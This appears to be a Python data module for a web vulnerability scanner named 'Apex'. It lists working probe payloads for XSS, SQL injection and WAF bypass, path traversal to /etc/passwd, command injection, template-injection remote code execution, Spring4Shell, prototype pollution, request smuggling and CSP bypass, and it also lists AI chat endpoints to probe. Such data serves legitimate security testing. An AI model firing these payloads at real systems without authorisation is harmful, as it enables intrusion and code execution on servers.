"""Probe and payload data for Apex."""

from __future__ import annotations

from typing import Dict, List, Tuple

_XSS_PAYLOADS: List[str] = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "javascript:alert(1)",
    "<details open ontoggle=alert(1)>",
]

_SQLI_PAYLOADS: List[str] = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "') OR ('1'='1",
    "1 OR 1=1",
    "1' AND SLEEP(2)--",
    "' UNION SELECT NULL--",
]

_WAF_BYPASS: List[str] = [
    "/**/OR/**/1=1--",
    "%27%20OR%201%3D1--",
    "'/**/OR/**/'a'='a",
    "' OR 1 LIKE 1--",
    "' /*!50000OR*/ 1=1--",
]

_LFI_PAYLOADS: List[str] = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
]

_CMDI_PAYLOADS: List[str] = [
    ";id",
    "|id",
    "`id`",
    "$(id)",
    "&& id",
    "|| id",
    "; whoami",
    "| whoami",
    "\nwhoami",
]

_SSTI_MARKERS: List[str] = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{{1337*1337}}",
]

_CRLF_PAYLOADS: List[str] = [
    "%0d%0aX-Injected-Header:%20scanner",
    "%0D%0AX-Injected-Header:%20scanner",
    "\r\nX-Injected-Header: scanner",
]

_OPEN_REDIRECT_PROBES: List[str] = [
    "https://example.com",
    "//example.com",
    "///example.com",
    "https:example.com",
    "/\\example.com",
]

_NOSQL_PAYLOADS: List[str] = [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    "[$ne]=x",
    "[$gt]=",
]

_XSS_BYPASS_PAYLOADS: List[str] = [
    "<svg><script>alert(1)</script></svg>",
    "<img src=x onerror=confirm(1)>",
    "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=x onerror=alert(1)>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
]

_RACE_PROBE_PATHS: List[str] = [
    "/redeem", "/checkout", "/cart/checkout", "/transfer", "/api/redeem",
    "/api/checkout", "/api/order", "/api/payment", "/coupon/apply",
]

_SMUG_TE_OBFUSCATIONS: List[str] = [
    "chunked",
    "xchunked",
    " chunked",
    "chunked ",
    "chunked, chunked",
    "identity, chunked",
    "chunked\r",
]

_SSTI_DIST_PROBES: List[Tuple[str, str, str]] = [
    ("{{7*7}}", "49", "jinja2"),
    ("${7*7}", "49", "freemarker"),
    ("<%= 7*7 %>", "49", "erb"),
    ("#{7*7}", "49", "spring-el"),
    ("{{7*'7'}}", "7777777", "twig"),
]

_SSTI_RCE: Dict[str, List[str]] = {
    "jinja2": [
        "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
        "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
    ],
    "twig": ["{{['id']|filter('system')}}"],
    "freemarker": ["<#assign ex='freemarker.template.utility.Execute'?new()> ${ ex('id') }"],
    "velocity": ["#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))"],
    "erb": ["<%= `id` %>"],
    "smarty": ["{php}echo `id`;{/php}"],
    "spring-el": ["${T(java.lang.Runtime).getRuntime().exec('id')}"],
}

_CP_UNKEYED_PROBES: List[Tuple[str, str]] = [
    ("X-Forwarded-Host", "scanner-cache.test"),
    ("X-Host", "scanner-cache.test"),
    ("X-Forwarded-Scheme", "https"),
    ("X-Original-URL", "/scanner-cache"),
    ("Forwarded", "host=scanner-cache.test"),
]

_PP_ESCALATION_GADGETS: List[Tuple[str, str, str]] = [
    ("isAdmin", '{"__proto__":{"isAdmin":true}}', "isAdmin"),
    ("polluted", '{"constructor":{"prototype":{"polluted":"yes"}}}', "polluted"),
    ("template", '{"__proto__":{"client":true}}', "client"),
]

_TOK_HARVEST_PATHS: List[Tuple[str, str, str]] = [
    ("/", "GET", ""),
    ("/api/me", "GET", ""),
    ("/account", "GET", ""),
    ("/profile", "GET", ""),
    ("/dashboard", "GET", ""),
]

_XSS_TAG_CHECKS: List[str] = [
    "script", "img", "svg", "iframe", "body", "input", "details", "math",
]

_CVE_SPRING4SHELL_DATA: Dict[str, str] = {
    "class.module.classLoader.DefaultAssertionStatus": "true",
    "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "%25%7Bc2%7Di",
}

_PARAM_WORDLIST: List[str] = [
    "admin", "debug", "test", "role", "user", "id", "uid", "account", "tenant",
    "org", "redirect", "url", "next", "callback", "return", "path", "file",
    "include", "template", "view", "page", "q", "query", "search", "filter",
    "sort", "limit", "offset", "token", "key", "secret", "api_key", "auth",
    "bypass", "preview", "draft", "internal", "private", "feature", "flag",
]

_FIELD_CATEGORIES: Dict[str, List[str]] = {
    "auth": ["role", "admin", "isAdmin", "permissions", "scope"],
    "tenant": ["tenant", "tenant_id", "org", "org_id", "account_id"],
    "money": ["price", "amount", "discount", "coupon", "quantity"],
    "routing": ["next", "redirect", "return", "callback", "url"],
    "file": ["file", "path", "template", "include", "view"],
}

_TAINT_SOURCES: List[Tuple[str, str]] = [
    ("location.search", "query string"),
    ("location.hash", "hash"),
    ("document.cookie", "cookie"),
    ("localStorage", "localStorage"),
    ("sessionStorage", "sessionStorage"),
    ("postMessage", "postMessage"),
]

_TAINT_SINKS: Tuple[Tuple[str, str, str], ...] = (
    ("innerHTML", "dom-xss", "HTML assignment"),
    ("outerHTML", "dom-xss", "HTML assignment"),
    ("insertAdjacentHTML", "dom-xss", "HTML insertion"),
    ("document.write", "dom-xss", "document write"),
    ("eval", "code-exec", "eval"),
    ("setTimeout", "code-exec", "string timer"),
    ("Function", "code-exec", "function constructor"),
)

_JS_EXTRA_SINKS: Tuple[Tuple[str, str, str], ...] = (
    ("srcdoc", "dom-xss", "iframe srcdoc"),
    ("location.href", "open-redirect", "navigation"),
    ("window.open", "open-redirect", "navigation"),
)

_SSTI_ENGINE_PROBES: List[Tuple[str, str]] = [
    ("jinja2", "{{1337*1337}}"),
    ("twig", "{{1337*1337}}"),
    ("freemarker", "${1337*1337}"),
    ("erb", "<%= 1337*1337 %>"),
    ("spring-el", "#{1337*1337}"),
]

_SSTI_PROBE_TEMPLATES: List[Tuple[str, str, str, str, str, str]] = [
    ("{{7*7}}", "49", "{{7*'7'}}", "7777777", "jinja2", "{{ cycler.__init__.__globals__.os.popen('id').read() }}"),
    ("${7*7}", "49", "${'x'?upper_case}", "X", "freemarker", "<#assign ex='freemarker.template.utility.Execute'?new()> ${ ex('id') }"),
    ("<%= 7*7 %>", "49", "<%= 'x'.upcase %>", "X", "erb", "<%= `id` %>"),
]

_CSP_JSONP_GADGETS: Dict[str, List[str]] = {
    "ajax.googleapis.com": ["/ajax/services/feed/find?v=1.0&q=x&callback=alert"],
    "www.google.com": ["/complete/search?client=chrome&q=x&jsonp=alert"],
    "code.jquery.com": ["/jquery-1.12.4.min.js"],
}

_LLM_CHAT_PATHS: List[str] = [
    "/chat", "/api/chat", "/api/v1/chat/completions", "/v1/chat/completions",
    "/ask", "/prompt", "/completion", "/generate", "/api/generate",
]

_MCP_AUTH_MIDDLEWARE_NGINX = """\
location /mcp {
    auth_request /_mcp_auth;
    proxy_pass http://127.0.0.1:3000;
}
"""

_HPB_SEMANTIC_VARIANTS: Dict[str, List[str]] = {
    "admin": ["true", "1", "yes"],
    "debug": ["true", "1", "verbose"],
    "role": ["admin", "superuser", "owner"],
    "tenant": ["1", "0", "default"],
}

_HPB_STATIC_PRIOR: List[Tuple[str, float]] = [
    ("admin", 0.95),
    ("debug", 0.85),
    ("role", 0.80),
    ("isAdmin", 0.80),
    ("tenant", 0.75),
    ("bypass", 0.70),
    ("preview", 0.55),
]

__all__ = [
    "_XSS_PAYLOADS", "_SQLI_PAYLOADS", "_WAF_BYPASS", "_LFI_PAYLOADS", "_CMDI_PAYLOADS",
    "_SSTI_MARKERS", "_CRLF_PAYLOADS", "_OPEN_REDIRECT_PROBES", "_NOSQL_PAYLOADS",
    "_XSS_BYPASS_PAYLOADS", "_RACE_PROBE_PATHS", "_SMUG_TE_OBFUSCATIONS",
    "_SSTI_DIST_PROBES", "_SSTI_RCE", "_CP_UNKEYED_PROBES", "_PP_ESCALATION_GADGETS",
    "_TOK_HARVEST_PATHS", "_XSS_TAG_CHECKS", "_CVE_SPRING4SHELL_DATA",
    "_PARAM_WORDLIST", "_FIELD_CATEGORIES", "_TAINT_SOURCES", "_TAINT_SINKS",
    "_JS_EXTRA_SINKS", "_SSTI_ENGINE_PROBES", "_SSTI_PROBE_TEMPLATES",
    "_CSP_JSONP_GADGETS", "_LLM_CHAT_PATHS", "_MCP_AUTH_MIDDLEWARE_NGINX",
    "_HPB_SEMANTIC_VARIANTS", "_HPB_STATIC_PRIOR",
]
